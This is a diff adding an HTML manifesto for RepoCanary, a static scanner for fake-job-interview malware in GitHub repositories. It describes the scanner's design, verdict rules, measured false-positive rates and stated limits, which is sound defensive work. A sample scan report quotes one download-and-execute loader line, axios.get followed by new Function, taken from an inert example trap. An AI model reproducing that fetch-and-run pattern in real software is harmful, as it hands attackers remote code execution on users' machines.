@@ -1,0 +1,384 @@
+<!-- COVER -->
+<section class="cover">
+  <div class="cover-strata"><span></span><span></span><span></span><span></span></div>
+  <div class="cover-in">
+    <div class="cover-brand">{{LOGO:34}}<span>RepoCanary</span></div>
+    <div class="cover-mid">
+      <div class="kicker">Manifesto</div>
+      <h1>Read, never run. Judge honestly. Publish the limits.</h1>
+      <p class="thesis">RepoCanary checks a GitHub repository for the known signatures of fake-job-interview malware without ever running a line of it. This manifesto says what the project believes, how it is built, what it does today and where it stops.</p>
+    </div>
+    <div class="cover-big">{{LOGO:210}}</div>
+    <div class="toc">
+      <div class="toc-h">Contents</div>
+      <ol>
+        <li><span>What we believe</span><b>2</b></li>
+        <li><span>The problem</span><b>5</b></li>
+        <li><span>The idea</span><b>6</b></li>
+        <li><span>How a scan runs</span><b>7</b></li>
+        <li><span>What it detects</span><b>9</b></li>
+        <li><span>The verdict</span><b>10</b></li>
+        <li><span>Three surfaces, one engine</span><b>11</b></li>
+        <li><span>What it does today</span><b>12</b></li>
+        <li><span>Measured</span><b>13</b></li>
+        <li><span>Security and privacy</span><b>15</b></li>
+        <li><span>How it is made</span><b>16</b></li>
+        <li><span>Limits today</span><b>18</b></li>
+      </ol>
+    </div>
+    <div class="cover-foot"><span>Chris Zemmel (Zyric)</span><span>repocanary.com</span></div>
+  </div>
+</section>
+
+<!-- 01 -->
+<section class="sec pb" id="believe">
+  <div class="num">01</div>
+  <h2>What we believe</h2>
+  <p class="lead">Someone asked to run a stranger’s repository usually has a few minutes and no tool for the job. RepoCanary gives that person a fast, free and honest read. The project follows seven principles. Each is built into the code, and each has a real case behind it.</p>
+
+  <div class="kpis">
+    <div class="kpi"><b>Sept.&nbsp;27, 2026</b><span>first release on npm and public on GitHub</span></div>
+    <div class="kpi"><b>100+</b><span>documented attack techniques, each caught in the catalog</span></div>
+    <div class="kpi"><b>90+</b><span>detection rules the catalog fires</span></div>
+    <div class="kpi"><b>750+</b><span>automated tests, offline, nothing to install</span></div>
+    <div class="kpi"><b>4,000+</b><span>repositories measured that the rules had never seen</span></div>
+    <div class="kpi"><b>0</b><span>runtime dependencies, and 0 lines of the target ever run</span></div>
+  </div>
+
+  <div class="pr">
+    <div class="pr-n">1</div>
+    <div>
+      <h3>Read, never run</h3>
+      <p class="stmt">RepoCanary never clones, installs, executes, evaluates or imports the repository it checks. It reads files as text and matches patterns.</p>
+      <div class="pr-cols">
+        <div><div class="label">Why</div><p>A tool that ran a stranger’s code to check it would be the attack. Pointing RepoCanary at malware must risk no more than reading the files in a browser.</p></div>
+        <div class="pr-case"><div class="label">The case</div><p>A test fails the build as soon as the engine imports <code>child_process</code>, uses <code>eval</code>, or contacts any host other than the GitHub API and, only when asked, an AI provider (<code>test/invariants.test.js</code>). When the docs promised the code was “never downloaded”, they were corrected: files are read into memory to be checked, but never run or saved.</p></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pr">
+    <div class="pr-n">2</div>
+    <div>
+      <h3>Green does not mean safe</h3>
+      <p class="stmt">A green verdict says “nothing known matched” and never more. A scan that could not finish never passes itself off as one that found nothing.</p>
+      <div class="pr-cols">
+        <div><div class="label">Why</div><p>False reassurance is the most expensive result a tool like this can give. People who read “safe” run the code. A check that could not look must not look like one that found nothing.</p></div>
+        <div class="pr-case"><div class="label">The case</div><p>The sentence for green lives in one place in the code and is used verbatim everywhere. A test checks that it says outright: not proof of safety. An incomplete scan ends with exit code&nbsp;3, still writes a JSON or SARIF document with the verdict “error”, and fails the GitHub Action under every setting.</p></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pr">
+    <div class="pr-n">3</div>
+    <div>
+      <h3>Red has to be worth believing</h3>
+      <p class="stmt">Red is kept for the shape of a trap. Anything uncertain is yellow. How often red hits an honest project is measured on code nobody tuned for, not estimated.</p>
+      <div class="pr-cols">
+        <div><div class="label">Why</div><p>A warning that fires on honest projects teaches people to skip it. Then the real red is worthless too.</p></div>
+        <div class="pr-case"><div class="label">The case</div><p>In the first measurement wave, about 13&nbsp;percent of red verdicts were wrong. Each mistake was fixed with a general principle, never an exception: red needs something that runs by itself. Text is not a command until it reaches a shell. Mentioning is not doing (chapter&nbsp;9).</p></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pr">
+    <div class="pr-n">4</div>
+    <div>
+      <h3>The limits live in the repository</h3>
+      <p class="stmt">What RepoCanary does not catch is written into its threat model. The most important limits ship as samples that must keep getting through.</p>
+      <div class="pr-cols">
+        <div><div class="label">Why</div><p>A security tool that hides its limits misleads exactly the people who most need the truth.</p></div>
+        <div class="pr-case"><div class="label">The case</div><p>Six documented limits are kept as runnable samples, and the benchmark asserts they are still missed, so a limit that quietly moves gets noticed. RepoCanary reports its own repository as red, because it has to contain its signatures. An exemption would be an evasion path, so there is none.</p></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pr">
+    <div class="pr-n">5</div>
+    <div>
+      <h3>A model never decides red</h3>
+      <p class="stmt">An AI second opinion is available, but only on request and with the user’s own key. It may clear a yellow or raise a green. It may never lower a red or produce one.</p>
+      <div class="pr-cols">
+        <div><div class="label">Why</div><p>Red means a signature fired. A model’s opinion is not a signature. And models often decline questions about malware, so the verdict cannot depend on one answering.</p></div>
+        <div class="pr-case"><div class="label">The case</div><p>The bound sits in the code that merges the verdict, not in the prompt, and tests hold it in place. If a provider declines or fails, the next one is tried, then the static verdict stands. When the AI was told the length of the capped findings list instead of the true count, that was fixed.</p></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pr">
+    <div class="pr-n">6</div>
+    <div>
+      <h3>Hostile input is the normal case</h3>
+      <p class="stmt">What RepoCanary reads was often written by an attacker. Every rule has to survive crafted files without hanging, crashing or letting the output be forged.</p>
+      <div class="pr-cols">
+        <div><div class="label">Why</div><p>A scanner that one crafted file can stall, or trick into an empty report, delivers nothing exactly when it matters.</p></div>
+        <div class="pr-case"><div class="label">The case</div><p>Every rule is held to linear cost, measured on hostile files at the largest size a scan accepts. If a rule still fails, it costs only that file’s findings. Control and bidirectional characters are neutralized before output, so no repository can spoof the terminal.</p></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pr">
+    <div class="pr-n">7</div>
+    <div>
+      <h3>Open and free</h3>
+      <p class="stmt">The code and the rules are public under the MIT license. There is no account, no telemetry and no paid tier.</p>
+      <div class="pr-cols">
+        <div><div class="label">Why</div><p>The person RepoCanary is for cannot buy a scanner. And nobody should trust a security tool nobody can audit.</p></div>
+        <div class="pr-case"><div class="label">The case</div><p>The CLI has no runtime dependencies, and a lint step enforces that. The npm package is published through Trusted Publishing with provenance. No publishing token exists anywhere.</p></div>
+      </div>
+    </div>
+  </div>
+  <div class="triad">
+    <div class="t-bad"><h4>{{I:triangle-alert}} Red</h4><p>A high-severity signature matched. Do not run it, do not install it, do not open it in an editor that runs tasks by itself.</p></div>
+    <div class="t-na"><h4>{{I:eye}} Yellow</h4><p>Something looks suspicious but has an honest explanation in some projects. Have someone read the flagged lines first.</p></div>
+    <div class="t-ok"><h4>{{I:circle-check}} Green</h4><p>Nothing known matched. That lowers the risk but proves nothing, and the report says so.</p></div>
+  </div>
+</section>
+
+<!-- 02 -->
+<section class="sec pb" id="problem">
+  <div class="num">02</div>
+  <h2>The problem</h2>
+  <p class="lead">Someone sends a repository and asks you to run it, or just open it: a recruiter with a take-home task, a “client”, someone who wants a second opinion. The payload sits where it runs before you have read anything.</p>
+  {{FIG:attack|Fig. 1|The attack. A repository arrives with a request to run it. Through the install, by opening the folder, or on first start: the payload runs before anyone has read the code, and takes what is on the machine.}}
+  <p>Campaigns like “Contagious Interview”, attributed to North Korean state actors, have used this against thousands of developers, and ordinary criminals now copy the tooling. A <code>postinstall</code> script, an obfuscated config file, a poisoned lockfile entry, or no install step at all: a VS Code task that runs when the folder opens, an MCP server an AI editor starts by itself, an agent hook or a dev container.</p>
+  <div class="three">
+    <div><h4>{{I:hourglass}} Runs before reading</h4><p>The trap sits in install hooks and autoruns. Reading first only helps if you know where to look.</p></div>
+    <div><h4>{{I:folder-open}} Opening is enough</h4><p>Some paths need no command at all. Opening the folder in an editor to look at it is already the attack.</p></div>
+    <div><h4>{{I:file-search}} Code as bait</h4><p>The visible code is often harmless. It only fetches what arrives at run time.</p></div>
+  </div>
+</section>
+
+<!-- 03 -->
+<section class="sec pb" id="idea">
+  <div class="num">03</div>
+  <h2>The idea</h2>
+  <p class="lead">RepoCanary checks before the code reaches your editor or terminal, and it only reads. Pointing it at malware carries no more risk than reading the files in a browser.</p>
+  {{FIG:safe|Fig. 2|Read, never run. RepoCanary fetches the file tree and selected files as plain text through the GitHub API. Findings go to an AI provider only on request. Cloning, installing, executing, evaluating and importing do not exist in the code, and a test fails the build if that changes.}}
+  <p>RepoCanary reads a bounded selection of files from the repository. Every check is plain text and pattern matching. The scanned link goes to <code>api.github.com</code> and nowhere else, and it is never written to disk. In practice the CLI needs a GitHub token with read access to public repositories, because GitHub limits anonymous requests tightly.</p>
+  <p>The same repository produces the same bytes in the report, whatever ran before. Reference reports in the repository pin that down, byte for byte. A verdict that depended on chance or ordering could be neither checked nor compared.</p>
+  <div class="callout">
+    <div class="callout-h">{{I:shield-check}} What RepoCanary is, and is not</div>
+    <p>A smoke detector, not a force field. It recognizes the known shape of an attack in files. A repository that fetches its payload from a server at run time can pass as green. That is why green never means “safe” (chapter&nbsp;12).</p>
+  </div>
+</section>
+
+<!-- 04 -->
+<section class="sec pb" id="scan">
+  <div class="num">04</div>
+  <h2>How a scan runs</h2>
+  <p class="lead">A scan has seven steps. The first four decide what gets read, the last three what it means.</p>
+  {{FIG:pipeline|Fig. 3|Seven steps. The tree is read and ranked by where a trap has to live. Whatever a file says will run is fetched on purpose. Then every rule runs on every file, severity sets the color, and the report gives each finding its file, line, reason and next step.}}
+  <h3>Select and follow</h3>
+  <p>A repository can be large, and a scan does not read everything. So what has to run before anyone reads comes first: install hooks, editor and agent autoruns, lockfiles, build scripts. Each kind has its own quota, so none can spend the whole budget. Ordinary source fills the rest.</p>
+  <p>A <code>postinstall</code> that runs <code>node scripts/setup.js</code>, an <code>npm run</code> chain, a <code>bin</code> entry, a VS Code task: whatever a file says will execute is fetched on a reserved budget of its own. A large repository cannot crowd out the one file the verdict depends on. When a cap is reached, the report says so in a note.</p>
+  <h3>The report</h3>
+  <p>Every finding names the file and line, explains in plain language why it matters, and says what to do next. Snippets are shortened before output and long encoded runs are redacted, so no working payload ends up in the report.</p>
+  <div class="code-fig">
+<pre><code><span class="k">RepoCanary scan: some-recruiter/take-home-task (ref: main)</span>
+
+<span class="k">Verdict: RED</span>
+
+Danger: some-recruiter/take-home-task matches known malware-trap signatures.
+Do not run it.
+<span class="c">[…]</span>
+Scanned 6 files (1 KB). Findings: 3 high, 1 medium, 4 low.
+<span class="c">[…]</span>
+  2. <span class="n">[HIGH]</span> download-and-execute
+     <span class="s">server/config/initDatabase.js:6</span>
+     &gt; const { data } = await axios.get(src); new Function('require',
+     &gt; data)(require); await mongoose.connect(process.env.MONGO_URL ||
+     Why it matters: This code downloads something from the internet and runs
+     it as a program. That means the visible source is only stage one; the
+     real payload arrives at run time.
+     What to do: Do not run this repository. The fetched code can differ per
+     victim, so no review of the repo alone clears it.
+<span class="c">[…]</span>
+Exit code: 2 (0 green, 1 yellow, 2 red, 3 scan failed)</code></pre>
+    <figcaption><b>Fig. 4</b> Real CLI output, shortened. The scan target is the example trap the repository keeps for its screenshots: a take-home task whose <code>postinstall</code> starts a loader. A VS Code task also starts it when the folder opens. The loader’s address ends in <code>.invalid</code> and resolves nowhere.</figcaption>
+  </div>
+  {{PHONES:red,findings,green|The same check on repocanary.com on a phone: the verdict and the findings with file and line. The page is the public website, but the answer to its scan request is the real engine’s offline scan of the same example, because a real malicious repository does not belong here. On the right, a real, complete scan of the example repository the site itself offers: green, worded as “nothing known matched”.}}
+</section>
+
+<!-- 05 -->
+<section class="sec pb" id="detects">
+  <div class="num">05</div>
+  <h2>What it detects</h2>
+  <p class="lead">The catalog covers more than 100 techniques from the campaigns and the wider npm and PyPI attack playbook, in nine categories. It is measured, not asserted.</p>
+  {{PHONE:coverage}}
+  <p>Each technique is reproduced as a whole, plausible repository with inert endpoints. A script runs the real engine over every sample and records which rules fire and what verdict results. That output becomes the catalog in the repository and the website’s <code>/coverage</code> page. The gates fail if the catalog drifts from the rules or a technique stops being caught.</p>
+  <p>The models are the publicly documented families Contagious Interview, BeaverTail, InvisibleFerret and OtterCookie. About two thirds of the techniques get red, the rest yellow, and none stays green.</p>
+  <p>Files that give instructions to an AI agent are a case of their own. RepoCanary catches the mechanical tricks in them, such as hidden text, invisible tag characters or a link that carries a secret out. It cannot judge a plain-language request meant to talk an agent into something harmful.</p>
+  <p>A VS Code task that runs when the folder opens is always red, whatever it runs: in a stranger’s repository, opening it to read it is already the attack.</p>
+  {{FIG:categories|Fig. 5|Nine categories, each with examples. Context signals such as a brand-new account are dashed: on their own they can lead to yellow at most, never to red.}}
+  <p>The catalog is a regression guard, not a detection rate. Every rule needs a sample, so by construction the catalog only covers what the rules already catch. An honest detection rate needs malware written by someone else, scanned on frozen rules. There is none yet, and the repository says so itself.</p>
+</section>
+
+<!-- 06 -->
+<section class="sec pb" id="verdict">
+  <div class="num">06</div>
+  <h2>The verdict</h2>
+  <p class="lead">The static rules decide the verdict, and nothing else does. The rules for it are simple enough that each fits in one sentence.</p>
+  {{FIG:verdict|Fig. 6|How the color is decided, with the CLI’s exit code. A scan that could not finish ends with code&nbsp;3, never with green.}}
+  <p>Weak signals that describe the same observation count as one: a minified library trips several encoded-content rules at once, but it is a single fact about the project.</p>
+  <h3 class="clear">The AI second opinion</h3>
+  <p>With <code>--ai</code>, the findings go to a language model on the user’s own key: paths, redacted snippets, reasons and public repository metadata, nothing from the user’s machine. Four providers are supported, two with a free tier. A key is never accepted as an argument and is held in memory for that run only.</p>
+  {{FIG:ai|Fig. 7|What the AI may do: raise a green to yellow, and clear a yellow when every signal is clearly benign. It may never lower a red or produce one.}}
+</section>
+
+<!-- 07 -->
+<section class="sec pb" id="surfaces">
+  <div class="num">07</div>
+  <h2>Three surfaces, one engine</h2>
+  <p class="lead">The CLI, the website and the GitHub Action run the same detector. A rule behaves the same everywhere.</p>
+  {{FIG:surfaces|Fig. 8|One engine in plain Node with zero runtime dependencies, and four ways to a verdict behind it. The exit codes are the same in the CLI and the Action, and code&nbsp;3 is never a success.}}
+  {{PHONE:home}}
+  <p><b>CLI.</b> <code>npx repocanary owner/repo</code> needs no install and no account, only Node. Output comes as text, as versioned JSON, and as SARIF for GitHub code scanning.</p>
+  <p><b>Website.</b> Anyone without a terminal pastes the link on repocanary.com and reads the same result. Nothing from the repository is run there or saved on the visitor’s machine. The site needs no account, sets no cookies and runs no analytics.</p>
+  <p><b>GitHub Action.</b> A workflow can scan a repository before anyone on the team runs it, and fail the step at a chosen verdict. The README advises pinning the Action by full commit SHA rather than by tag: a tag can be moved, and the Action runs with the token of your own runner.</p>
+  <p><b>Badge.</b> A project can show what RepoCanary says about it next to its CI status. If the scan could not run, the badge reads “unavailable”, never green.</p>
+  <p>Hosting the website yourself needs no database and no queue, only a GitHub token.</p>
+</section>
+
+<!-- 08 -->
+<section class="sec pb" id="today">
+  <div class="num">08</div>
+  <h2>What it does today</h2>
+  <p class="lead">Every capability is listed with its status. <span class="st live">{{I:circle-check}} live</span> means: shipped on the main branch and usable through npm or repocanary.com.</p>
+  <table class="tbl caps">
+    <tr><th>Area</th><th>What it does</th><th>Status</th></tr>
+    <tr><td>CLI</td><td><code>npx repocanary</code>, no install and no account, with honest exit codes from 0 to 3.</td><td><span class="st live">{{I:circle-check}} live</span></td></tr>
+    <tr><td>Website</td><td>Paste a link, scan, read the result, on a phone too, with an example scan to try.</td><td><span class="st live">{{I:circle-check}} live</span></td></tr>
+    <tr><td>GitHub Action</td><td>A scan in a workflow, with <code>fail-on</code>, a SARIF file and the verdict as output.</td><td><span class="st live">{{I:circle-check}} live</span></td></tr>
+    <tr><td>Badge</td><td>The verdict as a README badge, “unavailable” instead of green when no check was possible.</td><td><span class="st live">{{I:circle-check}} live</span></td></tr>
+    <tr><td>Machine-readable</td><td>JSON with a fixed schema version and SARIF&nbsp;2.1.0, for a failed scan too.</td><td><span class="st live">{{I:circle-check}} live</span></td></tr>
+    <tr><td>Detection</td><td>More than 100 documented techniques in nine categories, across npm, Python, Rust, Go, the JVM, PHP and Ruby.</td><td><span class="st live">{{I:circle-check}} live</span></td></tr>
+    <tr><td>Catalog</td><td>Every technique with its verdict and the rules that fire, generated from the engine, in the repository and at <code>/coverage</code>.</td><td><span class="st live">{{I:circle-check}} live</span></td></tr>
+    <tr><td>AI second opinion</td><td>On request, on the user’s own key, across four providers, with no power over red.</td><td><span class="st live">{{I:circle-check}} live</span></td></tr>
+    <tr><td>Recovery guide</td><td>What to do after running a suspicious repository: steps in a fixed order, each with its reason.</td><td><span class="st live">{{I:circle-check}} live</span></td></tr>
+    <tr><td>Self-hosting</td><td>The website from source, with no database and no queue.</td><td><span class="st live">{{I:circle-check}} live</span></td></tr>
+  </table>
+  <div class="callout ind">
+    <div class="callout-h">{{I:siren}} Already ran it?</div>
+    <p>The guide <code>WHAT-TO-DO-NOW.md</code> starts with the step that matters most: take the machine off the network. Then move crypto funds to a new wallet from a different device, revoke tokens and keys, and change passwords, email first. Every report links to it.</p>
+  </div>
+</section>
+
+<!-- 09 -->
+<section class="sec pb" id="measured">
+  <div class="num">09</div>
+  <h2>Measured</h2>
+  <p class="lead">A scanner always looks good on the code it was tuned on. So the measurement that counted was on repositories nobody had scanned before. The numbers in this chapter come from the project’s measurement up to September&nbsp;24, 2026.</p>
+  <p>4,002 unseen repositories were scanned in 29 waves. Every red in a wave was opened and read, and the rules were fixed for what the wave got wrong before the next one was drawn. From wave&nbsp;16 the pool got harder on purpose: famous projects, crypto and trading bots, coding-agent tooling, and the newest repositories in the big languages, which install services and pipe installers into shells for a living. At the same time, the rules were frozen before each draw.</p>
+  {{FIG:wrongreds|Fig. 9|Wrong reds per wave, as a percentage of repositories. On broad draws the rate fell from 13&nbsp;percent to under 1&nbsp;percent on 246 take-home tasks. On the harder pool with frozen rules it fell from 9&nbsp;percent to 2.75&nbsp;percent (33 of 1,198 in waves 24 to 29). Values from the project documentation.}}
+  <p>On the hard pool, then, red hits about one honest repository in 36. That is the honest limit of a scanner that reads files and runs nothing. Many of those reds are not even wrong in the narrow sense: honest projects sometimes do exactly what the attack does, such as piping an installer into a shell from a root script, or writing a service that starts at login. The report says what the code does. Whether that is wanted is the reader’s call.</p>
+  <div class="case">
+    <div class="case-h"><div class="case-n">1</div><div><h3>Real traps found while measuring</h3><p>Measurement up to September&nbsp;24, 2026</p></div></div>
+    <p>While measuring, RepoCanary found 19 live traps in the wild, 13 of them from a single account. Among them: an obfuscated loader hidden far to the right of the visible part of a line that <code>npm start</code> runs, a trading bot built with an obfuscator, and a script that executes whatever a URL returns. This manifesto names neither accounts nor repositories.</p>
+  </div>
+  <div class="case">
+    <div class="case-h"><div class="case-n">2</div><div><h3>Well-known, difficult projects</h3><p>Measurement up to September&nbsp;24, 2026</p></div></div>
+    <p>On 71 well-known projects chosen because they are hard (native addons, package managers, crypto libraries, build systems), 53 were green and two were red, both correctly: one installs a boot service, the other pipes an installer into a shell in its dev container.</p>
+  </div>
+  <div class="case">
+    <div class="case-h"><div class="case-n">3</div><div><h3>Rules that age</h3><p>Weekly corpus run</p></div></div>
+    <p>A repository changes upstream, and a rule that was right last month convicts it this month. According to its own description, the weekly run against the live repositories has found two such regressions. No fixed test sample could have shown them.</p>
+  </div>
+  {{FIG:corpus|Fig. 10|The regression corpus: 3,408 public projects, rescanned every week against the live repositories. After the yellows were read class by class and the unhelpful ones fixed, yellow fell from 25 to 21&nbsp;percent. Every red in the corpus is listed with its reason, and the weekly run fails on any red that is not.}}
+  <div class="label" style="margin-top:6mm">The measurement at a glance, up to September&nbsp;24, 2026</div>
+  <div class="kpis" style="margin-top:1mm">
+    <div class="kpi"><b>4,002</b><span>unseen repositories in 29 waves</span></div>
+    <div class="kpi"><b>2.75&nbsp;%</b><span>wrong reds on the hard pool, rules frozen</span></div>
+    <div class="kpi"><b>3,408</b><span>projects in the weekly corpus</span></div>
+    <div class="kpi"><b>101&nbsp;/&nbsp;101</b><span>documented techniques caught, 69 red, 32 yellow</span></div>
+    <div class="kpi"><b>6&nbsp;/&nbsp;6</b><span>documented limits still missed, as intended</span></div>
+    <div class="kpi"><b>19</b><span>live traps found while measuring</span></div>
+  </div>
+</section>
+
+<!-- 10 -->
+<section class="sec pb" id="security">
+  <div class="num">10</div>
+  <h2>Security and privacy</h2>
+  <p class="lead">A scanner for hostile input has to withstand hostile input itself. And a security guarantee is only worth what stops it from quietly changing.</p>
+  <table class="tbl">
+    <tr><th>Area</th><th>How it works today</th></tr>
+    <tr><td>Execution</td><td>No cloning, no installing, no <code>eval</code>, no <code>child_process</code>. A test in the build holds this in place.</td></tr>
+    <tr><td>Network</td><td>Only <code>api.github.com</code> and, on request, the chosen AI provider. A test checks this too.</td></tr>
+    <tr><td>Cost</td><td>Every rule at linear cost, measured on files built to be slow. The worst case measured was 2.4&nbsp;seconds.</td></tr>
+    <tr><td>Output</td><td>Control and bidirectional characters are neutralized, so no repository can forge what the terminal shows. Long encoded runs are redacted.</td></tr>
+    <tr><td>Keys</td><td>Never as an argument, hidden when pasted, held in memory for one run, never on disk and never in a report.</td></tr>
+    <tr><td>Website</td><td>No account, no cookies, no analytics, nothing written to disk. The scanned link goes to GitHub only.</td></tr>
+    <tr><td>Supply chain</td><td>No runtime dependencies. The website’s dependencies are checked for known high advisories on every push. Actions are pinned to commit SHAs.</td></tr>
+    <tr><td>Publishing</td><td>Only from a tag on the main branch, after the same gates as CI, with a human approval step and provenance. No publishing token exists.</td></tr>
+    <tr><td>Reporting</td><td>Vulnerabilities privately through the repository’s Security tab, detection gaps as an ordinary issue with the link.</td></tr>
+  </table>
+  <p>The website rests on a web framework with its own dependencies. When critical security advisories for that framework appeared in November&nbsp;2026, it was upgraded. The CLI was not affected: it has no dependencies. There is no third-party review (chapter&nbsp;12).</p>
+</section>
+
+<!-- 11 -->
+<section class="sec pb" id="made">
+  <div class="num">11</div>
+  <h2>How it is made</h2>
+  <p class="lead">Work began on July&nbsp;24, 2026 in a private repository, with more than 300 commits and 50 merged pull requests. The code has been public since September&nbsp;27, 2026.</p>
+  <div class="miles">
+    <div><b>July&nbsp;24, 2026</b><span>First commit: a static scanner for traps in GitHub repositories</span></div>
+    <div><b>Sept.&nbsp;24, 2026</b><span>Measurement on 4,002 unseen repositories completed</span></div>
+    <div><b>Sept.&nbsp;27, 2026</b><span>First release on npm and GitHub, the first fix the same day</span></div>
+    <div><b>Oct.&nbsp;12, 2026</b><span>Website dependencies upgraded for high advisories</span></div>
+    <div><b>Nov.&nbsp;10, 2026</b><span>Website framework upgraded after critical advisories</span></div>
+  </div>
+  <p>RepoCanary is built and maintained by Chris Zemmel.</p>
+  <h3>The gates</h3>
+  {{FIG:gates|Fig. 11|Every push and every pull request runs the same steps. Each week the guard with every confirmed red and the whole corpus are added. Publishing only happens after the same gates, from a tag on the main branch, with a human approval step.}}
+  <ul class="tight">
+    <li><b>Offline tests.</b> More than 750 tests in more than 20 files run in about 25&nbsp;seconds with no network and nothing to install. Line coverage of the engine code is above 95&nbsp;percent.</li>
+    <li><b>Reference reports.</b> Text, JSON and SARIF output are compared byte for byte against fixed reports.</li>
+    <li><b>The guard.</b> Most fixes narrow a rule so a wrong red stops firing, and every one of those can only cost detection. So the guard checks every sample, every documented evasion and every confirmed red: nothing caught once may slip through.</li>
+    <li><b>Website.</b> More than 40 tests of its own, type checking and a build in a separate job, because the site imports the engine directly.</li>
+  </ul>
+  <h3 class="pb-before">Bugs that became rules</h3>
+  <table class="tbl cases">
+    <tr><th>Case</th><th>What happened</th><th>Rule since</th></tr>
+    <tr><td>The download in a comment</td><td>A download written in a comment, a help text or a string came out red.</td><td>Text is a command only where it reaches a shell.</td></tr>
+    <tr><td>The tool nobody runs</td><td>A maintainer script that downloads things turned honest projects red.</td><td>Red needs something that runs by itself. Otherwise a caution at most.</td></tr>
+    <tr><td>The double charge</td><td>The website took two units of its budget per scan, and one even for a cached answer.</td><td>Exactly one unit per real scan, none for a cached answer, with a test.</td></tr>
+    <tr><td>The capped count</td><td>The AI was told the length of the capped findings list, not the true number.</td><td>The AI gets the true number of findings.</td></tr>
+    <tr><td>The promise too big</td><td>The docs said “never downloaded”, though files are read into memory.</td><td>Claims are checked against the code: “never run or saved”.</td></tr>
+    <tr><td>The unchecked package</td><td>Before publishing, only the tests ran, not the zero-dependency lint and not the guard.</td><td>Publishing runs the same gates as CI.</td></tr>
+  </table>
+</section>
+
+<!-- 12 -->
+<section class="sec pb" id="limits">
+  <div class="num">12</div>
+  <h2>Limits today</h2>
+  <p class="lead">A manifesto that hides its limits does not deserve trust. RepoCanary is a smoke detector, not a force field.</p>
+  <div class="limits">
+    <div><h4>Only what is known, in files</h4><p>A payload fetched from a server only at run time, a compromised dependency that resolves normally from the registry, and new techniques with no rule yet can all pass as green.</p></div>
+    <div><h4>Attacks without code</h4><p>Instructions sent over chat, a request to register someone’s CI runner, or a plain-language request to an AI agent are outside what a file scan can see.</p></div>
+    <div><h4>Not everything is read</h4><p>RepoCanary does not read binary files, submodules or symlink targets, and reads large repositories only in part. Each such case appears as a note in the report.</p></div>
+    <div><h4>Red hits honest projects too</h4><p>As measured, red hits about one honest repository in 36 on the hard pool. Read the finding before you judge the project.</p></div>
+    <div><h4>No real detection rate</h4><p>The catalog is a regression guard. A measurement on malware written by others, on frozen rules, is still to come.</p></div>
+    <div><h4>No external audit</h4><p>The website has not been reviewed line by line, the GitHub client has not been fuzzed against hostile API responses, and the AI pass has not been tested against text written to manipulate the model. One person builds and maintains the project.</p></div>
+  </div>
+  <div class="unver">
+    <div class="label">What is not verified</div>
+    <p class="small" style="margin-bottom:2mm">“Not verified” is a valid status. These points are in the sources, but were not checked against reality for this manifesto:</p>
+    <ul>
+      <li>The numbers in chapter&nbsp;9 (waves, wrong reds, corpus, 71 projects, 19 traps, the 2.4-second worst case) come from the project’s measurement up to September 2026. It was not repeated for this manifesto, and the traps were not rechecked one by one.</li>
+      <li>The two regressions the weekly corpus run found are documented only in the workflow’s description.</li>
+      <li>The commit and pull request counts of the private development repository cannot be checked publicly.</li>
+      <li>Verified: the 750+ offline tests, the 40+ website tests, the coverage and the up-to-date catalog all passed for this manifesto. The red result in the screenshots is the offline scan of the repository’s example, played into the real website. The home page, the green example and the catalog are live.</li>
+      <li>The website’s availability in operation has not been measured.</li>
+    </ul>
+  </div>
+  <div class="contact">
+    {{LOGO:44}}
+    <div class="contact-body">
+      <div class="label">Contact</div>
+      <p class="contact-line"><span class="contact-name">Chris Zemmel</span> Zyric · repocanary.com · github.com/chriszemmel/repocanary</p>
+    </div>
+    <p class="contact-note small">RepoCanary is free software under the MIT license.</p>
+  </div>
+</section>
